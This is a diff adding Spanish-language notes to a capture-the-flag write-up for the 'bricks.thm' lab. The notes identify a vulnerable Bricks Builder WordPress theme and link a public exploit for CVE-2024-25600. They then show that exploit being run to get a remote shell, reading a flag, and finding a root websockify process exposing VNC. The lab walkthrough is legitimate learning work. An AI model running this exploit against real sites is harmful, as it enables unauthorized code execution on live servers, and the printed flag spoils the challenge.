@@ -115,13 +115,47 @@ vemos que esta usando un tema :
  | Version: 1.9.5 (80% confidence)
 
 
+bingo, en internet al buscar esa version de bricks encontramos 
+
+CVE-2024-25600 - WordPress Bricks Builder Remote Code Execution (RCE) 
+
+
+encontre un cve en github 
+
+https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT/blob/main/CVE-2024-25600.py
+
+
+el cual me permitio acceder a una shell 
+
+(.venv) [davidoberst@archlinux cve]$ python3 CVE-2024-25600.py -u https://bricks.thm/
 
 
 
+Shell> whoami
+apache
 
 
 
+ecnontre una bandera : 
+
+Shell> cat 650c844110baced87e1606453b93f22a.txt
+THM{fl46_650c844110baced87e1606453b93f22a}
+
+Shell> 
+
+
+una de las preguntas del reto es, What is the service name affiliated with the suspicious process? 
+
+asi que eso me dio una pista de que hacer, al usar 
+
+Shell> ps aux 
+
+
+revise los procesos y pude ver 
 
 
 
+root        1627  0.0  0.5 121120 22392 ?        S    04:43   0:02 python3 -m websockify 80 localhost:5901 -D
 
+
+redirige el puerto 80 a un puerto VNC interno 5901
